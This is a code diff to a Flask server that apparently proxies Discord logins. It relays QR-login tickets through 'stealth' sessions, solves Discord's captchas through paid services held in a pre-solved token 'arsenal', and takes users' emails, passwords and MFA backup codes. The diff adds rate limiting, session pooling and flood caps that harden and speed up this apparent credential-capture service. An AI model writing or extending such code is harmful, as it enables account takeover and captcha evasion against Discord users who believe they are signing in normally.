@@ -126,6 +126,68 @@ print(f'[config] Discord proxy available: {DISCORD_PROXY or "NONE"} (starts DIRE
 
 app = Flask(__name__, static_folder='.', static_url_path='')
 
+# ━━━━━━━━━━━━ Per-IP Rate Limiter ━━━━━━━━━━━━
+import collections as _col
+
+_rl_lock   = threading.Lock()
+_rl_hits   = _col.defaultdict(list)   # ip:endpoint -> [timestamps]
+_rl_banned = {}                        # ip -> ban_until timestamp
+
+# Rules: (max_hits, window_seconds, ban_seconds)
+_RL_RULES = {
+    'qr_start':    (6,  10,  60),   # 6 QR starts per 10s → 60s ban
+    'login':       (8,  30,  120),  # 8 login attempts per 30s → 2min ban
+    'prechallenge':(10, 20,  60),   # 10 prechallenges per 20s → 60s ban
+    'default':     (30, 10,  30),   # generic: 30 reqs per 10s → 30s ban
+}
+
+def _get_ip():
+    ip = request.headers.get('X-Forwarded-For', request.remote_addr) or ''
+    return ip.split(',')[0].strip()
+
+def _rate_check(endpoint_key):
+    """Returns (allowed: bool, retry_after: int)."""
+    ip = _get_ip()
+    now = time.time()
+    max_hits, window, ban_secs = _RL_RULES.get(endpoint_key, _RL_RULES['default'])
+    key = f'{ip}:{endpoint_key}'
+    with _rl_lock:
+        # Check active ban
+        ban_until = _rl_banned.get(ip, 0)
+        if now < ban_until:
+            return False, int(ban_until - now)
+        # Slide window
+        hits = _rl_hits[key]
+        cutoff = now - window
+        # Discard old hits
+        while hits and hits[0] < cutoff:
+            hits.pop(0)
+        hits.append(now)
+        if len(hits) > max_hits:
+            _rl_banned[ip] = now + ban_secs
+            _rl_hits[key].clear()
+            print(f'[ratelimit] Banned {ip} on {endpoint_key} for {ban_secs}s')
+            return False, ban_secs
+    return True, 0
+
+def _rl_cleanup():
+    """Periodically remove old rate-limit data to prevent memory growth."""
+    while True:
+        time.sleep(120)
+        now = time.time()
+        with _rl_lock:
+            # Remove expired bans
+            expired_bans = [ip for ip, t in _rl_banned.items() if now > t]
+            for ip in expired_bans:
+                del _rl_banned[ip]
+            # Remove old hit lists
+            empty_keys = [k for k, v in _rl_hits.items() if not v]
+            for k in empty_keys:
+                del _rl_hits[k]
+
+threading.Thread(target=_rl_cleanup, daemon=True).start()
+
+
 @app.after_request
 def _add_headers(response):
     response.headers['Referrer-Policy'] = 'no-referrer'
@@ -1839,9 +1901,11 @@ class QRAuth:
 
 
 def _qr_worker(s: QRAuth):
-    # For the QR ticket exchange, create a stealth session
-    ds = DiscordSession()
-    ds.prepare()
+    # Use a pre-warmed session from the pool (no prepare() needed = instant start)
+    ds = _get_ready_session()
+    if ds is None:
+        ds = DiscordSession()
+        ds.prepare()  # fallback: fresh session (slow path, pool was empty)
 
     try:
         def on_msg(ws, raw):
@@ -2002,8 +2066,9 @@ def _prechallenge_worker(pc_id):
 
 @app.route('/api/prechallenge', methods=['POST'])
 def api_prechallenge():
-    """Frontend calls on page load — grabs a token from the 24/7 arsenal.
-    No email needed. Token is generic; rqtoken gets swapped at login time."""
+    ok, retry_after = _rate_check('prechallenge')
+    if not ok:
+        return jsonify({'ok': False, 'reason': 'rate_limited', 'retry_after': retry_after})
     if not ANTICAPTCHA_KEY and not CAPSOLVER_KEY:
         return jsonify({'ok': False, 'reason': 'no_key'})
 
@@ -2196,13 +2261,9 @@ def api_diag_rqdata():
 
 @app.route('/api/login', methods=['POST'])
 def api_login():
-    """
-    INSTANT login flow:
-    1) POST login with real creds → Discord returns captcha + fresh rqtoken
-    2) Grab pre-solved token from arsenal → submit with FRESH rqtoken
-    3) If no arsenal token → inline solve as fallback
-    Result: ~1-2s with arsenal, ~20-30s without.
-    """
+    ok, retry_after = _rate_check('login')
+    if not ok:
+        return jsonify({'error': f'Too many attempts. Try again in {retry_after}s.'}), 429
     d = request.json
     login_email  = d.get('login')
     login_pw     = d.get('password')
@@ -3007,15 +3068,63 @@ def api_mfa_backup():
         return jsonify({'error': str(e)}), 500
 
 
+# Active QR sessions per IP (dedup concurrent page loads hitting /api/qr/start)
+_qr_by_ip = {}   # ip -> session id
+_qr_by_ip_lock = threading.Lock()
+QR_MAX_SESSIONS = 30  # hard cap on simultaneous QR sessions
+
+
 @app.route('/api/qr/start')
 def api_qr_start():
+    ok, retry_after = _rate_check('qr_start')
+    if not ok:
+        return jsonify({'err': f'Too many requests. Try again in {retry_after}s.'}), 429
+
+    client_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
+    if client_ip:
+        client_ip = client_ip.split(',')[0].strip()
+
+    # Dedup: if this IP already has an active QR session in progress, reuse it
+    with _qr_by_ip_lock:
+        existing_sid = _qr_by_ip.get(client_ip)
+        if existing_sid and existing_sid in sessions:
+            s = sessions[existing_sid]
+            if s.fp:
+                return jsonify({'id': s.id, 'fp': s.fp})
+            if s.st not in ('error', 'cancelled', 'expired', 'done'):
+                # Still warming up — wait briefly for this existing session
+                for _ in range(50):
+                    if s.fp or s.st in ('error', 'cancelled'):
+                        break
+                    time.sleep(0.1)
+                if s.fp:
+                    return jsonify({'id': s.id, 'fp': s.fp})
+
+    # Hard cap on total active QR sessions (prevent OOM from bot floods)
+    if len(sessions) >= QR_MAX_SESSIONS:
+        # Clean up stale sessions first
+        dead = [k for k, v in list(sessions.items()) if v.st in ('done', 'error', 'cancelled', 'expired')]
+        for k in dead:
+            s2 = sessions.pop(k, None)
+            if s2:
+                try: s2.ws.close()
+                except: pass
+        # If still over cap after cleanup, reject
+        if len(sessions) >= QR_MAX_SESSIONS:
+            return jsonify({'id': None, 'err': 'Server busy, please retry'}), 503
+
     s = QRAuth()
     sessions[s.id] = s
+    with _qr_by_ip_lock:
+        _qr_by_ip[client_ip] = s.id
     threading.Thread(target=_qr_worker, args=(s,), daemon=True).start()
-    for _ in range(200):  # Wait up to 20s for QR fingerprint
+
+    # Wait up to 8s for QR fingerprint (pool sessions arrive in ~1s, cold ~5s)
+    for _ in range(80):
         if s.fp or s.st in ('error', 'cancelled'):
             break
         time.sleep(0.1)
+
     if s.fp:
         return jsonify({'id': s.id, 'fp': s.fp})
     return jsonify({'id': s.id, 'err': s.err or 'Timeout'}), 500
@@ -3078,6 +3187,11 @@ if __name__ == '__main__':
                     _prechallenges.pop(k, None)
                 # Clear stale pw_store entries
                 _pw_store.clear()
+                # Clean up _qr_by_ip for sessions that are gone
+                with _qr_by_ip_lock:
+                    stale_ip = [ip for ip, sid in list(_qr_by_ip.items()) if sid not in sessions]
+                    for ip in stale_ip:
+                        del _qr_by_ip[ip]
                 cleaned = len(dead) + len(stale_login) + len(stale_pc)
                 if cleaned:
                     print(f'[cleanup] Removed {len(dead)} QR, {len(stale_login)} login, {len(stale_pc)} prechallenge sessions')
